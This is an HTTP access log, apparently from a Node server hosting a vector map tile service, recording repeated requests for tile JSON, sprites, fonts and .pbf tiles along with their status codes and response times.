{"level":"info","message":"GET / 404 9 - 0.428 ms"}
{"level":"info","message":"PROPFIND / 404 9 - 0.289 ms"}
{"level":"info","message":"GET / 404 9 - 0.271 ms"}
{"level":"info","message":"GET /unvt/rest/info?f=json 404 9 - 1.037 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json&callback=dojo_request_script_callbacks.dojo_request_script0 200 3675 - 1.262 ms"}
{"level":"info","message":"GET /unvt/rest/info?f=json 404 9 - 0.483 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json&callback=dojo_request_script_callbacks.dojo_request_script0 200 3675 - 0.802 ms"}
{"level":"info","message":"GET /unvt/rest/info?f=json 404 9 - 0.532 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer%0A?f=json 404 9 - 0.492 ms"}
{"level":"info","message":"GET /unvt/rest/info?f=json 404 9 - 0.432 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 304 - - 0.629 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/?f=json 304 - - 0.612 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/?f=json 304 - - 0.653 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.json 304 - - 0.366 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.png 304 - - 0.399 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.556 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.421 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.383 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.462 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.516 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.512 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.462 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.478 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.461 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.811 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.644 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.309 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 1.762 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 1.300 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.879 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.599 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.475 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.345 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.390 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.541 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.794 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.669 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.563 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.389 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.351 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.478 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.629 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.571 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.557 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.709 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.570 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.519 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.552 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.446 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.636 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.584 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 1.468 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.399 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.908 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.996 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.856 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 1.033 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.977 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 1.064 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.616 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.698 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.913 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.901 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.529 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.481 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.317 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.331 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.611 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.281 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.622 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.495 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.279 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.480 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.486 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.446 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.501 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.505 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.467 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.480 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.493 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.484 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.489 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.546 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.543 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.454 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.490 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.461 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.531 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.446 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.478 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.482 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 1.102 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 304 - - 0.606 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/root.json?f=json 304 - - 0.694 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 304 - - 0.550 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.json 304 - - 0.731 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.png 304 - - 0.480 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/0/0/0/32/32?f=json 304 - - 0.544 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/0/0/0/32/32?f=json 304 - - 0.511 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/32/32?f=json 304 - - 0.624 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/32/32?f=json 304 - - 0.509 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/1/0/1.pbf 200 22607 - 2.776 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/1/1/0.pbf 200 76538 - 3.158 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/1/0/0.pbf 200 80184 - 2.682 ms"}
{"level":"info","message":"GET /unvt/font/Open%20Sans%20Bold/0-255.pbf 304 - - 0.366 ms"}
{"level":"info","message":"GET /unvt/font/sans/0-255.pbf 304 - - 0.566 ms"}
{"level":"info","message":"GET /unvt/font/Open%20Sans%20Italic/0-255.pbf 304 - - 0.597 ms"}
{"level":"info","message":"GET /unvt/font/Open%20Sans%20Semibold%20Italic/0-255.pbf 304 - - 0.393 ms"}
{"level":"info","message":"GET /unvt/font/Open%20Sans%20Bold/256-511.pbf 304 - - 0.472 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/root.json?f=pjson&token=m8vAxaa8CBcxqomyNrQX_nlgwrKvQJC7ZNSekfdajaEXLA20YTyDyL166lOEMZQ6Ut4LTv52zuPNAwJRscC96KxY3SNTrfaA8VN9SDHVc2w3OqtwWBBp_qDBfqeBOYSzs-8uCsaP1JNfte95W-m8VJTJGuoVZrD7Tb9GiUG0AnZo6y6Sew7i0Z722QMSKoJVGORzi_fiiFrzZiZ3pHikmMzt_RvqLmJmVZQKmLEjW54. 200 215751 - 1.929 ms"}
{"level":"info","message":"GET /unvt/rest/info?f=json 404 9 - 0.759 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 304 - - 0.750 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/?f=json 304 - - 0.919 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/?f=json 304 - - 0.761 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.json 304 - - 0.489 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.png 304 - - 0.504 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.911 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.830 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.757 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.352 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.621 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 1.340 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.493 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.481 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.700 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.328 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.511 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.323 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.479 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 1.145 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.916 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.409 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.541 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.480 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.418 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.603 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.714 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.503 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.479 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.619 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.486 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.478 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.510 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.475 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.551 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.533 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 1.418 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 1.187 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 1.107 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.751 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.707 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.425 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.530 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.607 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.500 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.474 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.636 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.517 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 2.140 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 1.614 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 1.528 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 1.494 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 1.074 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.931 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.432 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.665 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.591 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.537 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.615 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.544 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.506 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.501 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.544 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.492 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.546 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/32/8/8 404 83 - 1.836 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/40/8/8 404 83 - 1.381 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/32/8/8 404 83 - 1.266 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 1.021 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.879 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/32/8/8 404 83 - 1.011 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.924 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.769 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/40/8/8 404 83 - 0.688 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.299 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/32/8/8 404 83 - 0.550 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/40/8/8 404 83 - 0.988 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.675 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/40/8/8 404 83 - 0.660 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/32/8/8 404 83 - 0.510 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.689 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.527 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.523 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/40/8/8 404 83 - 0.554 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.571 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.469 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.576 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/40/8/8 404 83 - 0.591 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer 304 - - 0.733 ms"}
{"level":"info","message":"GET / 404 9 - 0.582 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.267 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/root.json 200 215751 - 1.710 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 200 3675 - 1.044 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/0/0/0.pbf 200 100708 - 2.869 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/2/2/2.pbf 200 48323 - 4.818 ms"}
